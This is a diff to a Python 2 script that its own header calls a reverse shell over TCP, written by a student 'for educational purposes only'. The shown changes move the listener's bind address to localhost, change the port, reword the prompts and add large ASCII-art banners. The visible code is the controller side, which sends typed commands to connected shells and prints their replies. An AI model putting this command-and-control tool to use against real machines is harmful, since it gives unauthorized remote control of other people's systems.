@@ -1,4 +1,12 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#title           : Reverse Shell over TCP
+#description     : Script executing reverse shell connection over tcp sockets
+#author          : BADDOU SALAH EDDINE (From Ensa Marrakech)
+#python_version  : 2.7.x
+#Usage           : ./server.py
+#This is for educational purposes only ;)
 
 import socket 
 import os      
@@ -113,9 +121,10 @@ def _list():
 def connect():
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('192.168.1.2', 8096))
+        port=8084
+        s.bind(('127.0.0.1', port))
         s.listen(100)
-        print '[+] Listening for incoming TCP connection on port 8080'
+        print '[+] Listening for incoming TCP connection on port ',port
         threads=[]
         socks=[]
         users=[]
@@ -127,9 +136,10 @@ def connect():
             newthread.start()
             threads.append(newthread)
 
-        print 'To go to the menu of the manual of commands type help \n'
-        print 'To list the available commands type ?\n'
-        while True:   
+        print 'To go to the menu of the manual of commands type <<help>> \n'
+        print 'To list the available commands type <<?>>\n'
+        print 'To see connected users type <<who>>'
+        while True :   
                	command=raw_input(">")	
                	if halt :
                     for t in threads:
@@ -175,11 +185,34 @@ def connect():
                         socks[index].send(command)
                         print socks[index].recv(2048)
                   
-        
+
 def main ():
 
 	subprocess.call('clear',shell=True)
-	
+
+	print"oooooooooooo ooooo      ooo  .oooooo..o       .o.               ooo        ooooo       .o.       ooooooooo.   ooooooooo.         .o.       oooo    oooo oooooooooooo   .oooooo.   ooooo   ooooo"
+	print"`888'     `8 `888b.     `8' d8P'    `Y8      .888.              `88.       .888'      .888.      `888   `Y88. `888   `Y88.      .888.      `888   .8P'  `888'     `8  d8P'  `Y8b  `888'   `888' "								
+	print" 888          8 `88b.    8  Y88bo.          .8\"888.              888b     d'888      .8\"888.      888   .d88'  888   .d88'     .8\"888.      888  d8'     888         888           888     888  "
+	print" 888oooo8     8   `88b.  8   `\"Y8888o.     .8' `888.             8 Y88. .P  888     .8\' `888.     888ooo88P'   888ooo88P'     .8' `888.     88888[       888oooo8    888           888ooooo888  "
+	print" 888    \"     8     `88b.8       `\"Y88b   .88ooo8888.   8888888  8  `888'   888    .88ooo8888.    888`88b.     888`88b.      .88ooo8888.    888`88b.     888    \"    888           888     888  "
+	print" 888       o  8       `888  oo     .d8P  .8'     `888.           8    Y     888   .8'     `888.   888  `88b.   888  `88b.   .8'     `888.   888  `88b.   888       o `88b    ooo   888     888  "
+	print"888888oooooo d8o8o      `8  8""88888P'o   oo88o     o8888o        o8o        o888o o88o     o8888o o888o  o888o o888o  o888o o88o     o8888o o888o  o888o o888ooooood8  `Y8bood8P'  o888o   o888o "
+
+	print '\n\n' 
+	print' ▄▄▄▄▄▄▄▄▄▄   ▄         ▄       ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄ '
+	print'▐░░░░░░░░░░▌ ▐░▌       ▐░▌     ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌'
+	print'▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌'
+	print'▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌'
+	print'▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌'
+	print'▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌     ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌'
+	print'▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀      ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌      ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌'
+	print'▐░▌       ▐░▌     ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌               ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌'
+	print'▐░█▄▄▄▄▄▄▄█░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌      ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░▌       ▐░▌'
+	print'▐░░░░░░░░░░▌      ▐░▌          ▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌'
+	print' ▀▀▀▀▀▀▀▀▀▀        ▀            ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀ '
+	print '\n\n'
+
+
 	connect()
 
 main()
